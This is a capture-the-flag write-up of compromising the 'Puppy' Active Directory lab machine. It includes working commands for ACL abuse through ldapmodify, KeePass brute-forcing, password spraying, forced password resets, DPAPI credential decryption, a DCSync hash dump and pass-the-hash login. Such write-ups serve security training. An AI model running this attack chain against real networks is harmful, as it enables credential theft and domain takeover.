Hey everyone! It’s me again—although it’s only been a month since my last post, today I’m diving into how I pwned the Puppy machine. I really enjoyed solving this one and learned so much along the way. This 6/1000

## Port Scanning and Enumeration
I ran nmap scan for the top 1000 port 
```bash
nmap -sS 10.10.11.70 -F -T4 -sV -O

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 18:44 EDT

```
It's obvious that we are dealing with AD environment! i added the domain name beside its ip in /etc/hosts and will start digging in smb shares
```bash
crackmapexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated shares
SMB         puppy.htb       445    DC               Share           Permissions     Remark
SMB         puppy.htb       445    DC               -----           -----------     ------
SMB         puppy.htb       445    DC               ADMIN$                          Remote Admin
SMB         puppy.htb       445    DC               C$                              Default share
SMB         puppy.htb       445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         puppy.htb       445    DC               IPC$            READ            Remote IPC
SMB         puppy.htb       445    DC               NETLOGON        READ            Logon server share 
SMB         puppy.htb       445    DC               SYSVOL          READ            Logon server share 

```

DEV looks interesting, I will use smbclient to enumerate this shares
```bash
smbclient //puppy.htb/DEV -U 'levi.james%KingofAkron2025!'
```

But access was denied, i couldn't list or view anything, next will try ldap enumeration
```bash
ldapdomaindump ldap://10.10.11.70 -u "puppy.htb\levi.james" -p 'KingofAkron2025!'
```

From here i got valid usernames and groups, tried AS-REP Roasting but didn't work, and since i couldn't get a GUI access from the credentials I have, I will enumerate this domain using bloodhound.py

```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -dc DC.puppy.htb -c All --zip -ns 10.10.11.70
```
## Abusing ACL's
Then adding the zip file to Bloodhound GUI:
![w](/assets/img/attachments/puppy.png)

We got generic write on developers group!, so now we can add ourselves to this group
From ldap files that we got before, i will levis.james exact info 
![w](/assets/img/attachments/puppy-1.png)

and will create a .ldif file to modify ldap with it
```ldap
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```

Then
```bash
ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f mod.ldif
```

lets verify:
![w](/assets/img/attachments/puppy-2.png)

Now do u remember smb shares (DEV) that we couldn't list?
```bash
smbclient //puppy.htb/DEV -U 'levi.james%KingofAkron2025!'

> prompt OFF
> recurse ON
> mget *
```

 recovery.kdbx looks really catchy!
 But it needs password, I tried to search on a hardcoded password in `KeePassXC-2.7.9-Win64.msi` but with no look, so the next step is to brute force the pass. John didnt work (gave an error of file not supported) 
 We need to find a tool to crack a v 4 of kdbx file
 [This tool can do it!](https://github.com/r3nt0n/keepass4brute/blob/master/keepass4brute.sh)
 
```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
```
![w](/assets/img/attachments/puppy-3.png)
We got the password!

![w](/assets/img/attachments/puppy-4.png)
And now we have those users' password, let's find out which is valid!
We will be using the list of valid usernames that we used at AS-REP roasting attack at the beginning! + Password spraying using the passwords in this file

```bash
nxc smb 10.10.11.70 -u usernames.txt -p pass.txt
```
![w](/assets/img/attachments/puppy-5.png)
We got a valid username and password! However, I couldn't get a GUI with this user either. Let's check Bloodhound.

![w](/assets/img/attachments/puppy-6.png)
I'm in a group that have generic all on Adam Silver account! now I will try to change this user password, this part was really tricky!
## Modifying password externally
```bash
impacket-changepasswd puppy.htb/adam.silver@10.10.11.70 -newpass 'newP@ssw0rd123456!' -altuser puppy.htb/ant.edwards -altpass 'Antman2025!' -reset
```
Make sure the new password u set is acceptable by password policy (no weak password).
![w](/assets/img/attachments/puppy-7.png)
I couldn't log in after that. After a lot of searching, I found out that the account might have been **disabled by the DC** since we changed the password using **Impacket**.
```bash
rpcclient -U 'puppy.htb/ant.edwards%Antman2025!' 10.10.11.70 
> queryuser adam.silver
```

![w](/assets/img/attachments/puppy-8.png)
Now we need to reenable it
```bash
ldapmodify -x -D "ant.edwards@puppy.htb" -w 'Antman2025!' -H ldap://10.10.11.70
```
```ldif
dn: CN=ADAM D. SILVER,CN=Users,DC=puppy,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 16
```
![w](/assets/img/attachments/puppy-9.png)

And to verify it worked, will run rpcclient again (or Ldapsearch)
![w](/assets/img/attachments/puppy-10.png)

And finally we have terminal access!
```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p 'newP@ssw0rd123456!'  
```
## Priv Escalation
![w](/assets/img/attachments/puppy-11.png)

I used sharphound on this victim
```powershell
sharphound.exe -c ALL
```
But got nothing new, i run winpeas but found nothing intrested too.
After some digging, there is a folder named bakup and root directory

![w](/assets/img/attachments/puppy-12.png)

i downloaded this file 
![w](/assets/img/attachments/puppy-13.png)
## DPAPI Dump
And found in it this user password, lets test if its valid or not
![w](/assets/img/attachments/puppy-14.png)

I think its a hint for us, a DPAPI blobs may be found under `C:\Users\<username>\AppData\Roaming\Microsoft\Protect`, `APPDATA\Microsoft\Credentials\` & `LOCALAPPDATA\Microsoft\Vault\` so lets check

![w](/assets/img/attachments/puppy-15.png)
![w](/assets/img/attachments/puppy-16.png)
Found those hidden files, but since they are hidden we won't be able to downlaod them using download command
### Downloading hidden files
First we must
```powershell
attrib -h -s C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
```
and repeat for alll.

![w](/assets/img/attachments/puppy-17.png)
Then download
Now we have the key ingredients for a DPAPI master key decryption
- C8D69EBE9A43E9DEBF6B5FBD48B521B9 is blob.dpc
- 556a2412-1275-4ccf-b721-e6a0b4f90407 is the master key 
- S-1-5-21-1487982659-1829050783-2281216199-1107 SID

**First step:** is to decrypt the master key 
```bash
dpapi.py masterkey -file mkfile -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```
![w](/assets/img/attachments/puppy-18.png)

Now we use the decrypted key to get blob.dpc content
```bash
dpapi.py credential -file blob.dpc -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

## DCSync Attack
Great! we got the administrator's password! he was in domain admins group if u remember.
![w](/assets/img/attachments/puppy-20.png)

We can dump all user hashes!
**There's two methods:**
1- downloading folder containing dumped Registry Hives via PowerShell
2- or using secretdump.py with the valid credentials we got!

```bash
secretsdump.py 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
```
![w](/assets/img/attachments/puppy-21.png)
Then we connect using evil-winrm
```bash
evil-winrm -i 10.10.11.70 -u Administrator -H bb0edc15e49ceb4120c7bd7e6e65d75b
```
![w](/assets/img/attachments/puppy-22.png)
![w](/assets/img/attachments/puppy-23.png)
and Done! see u later
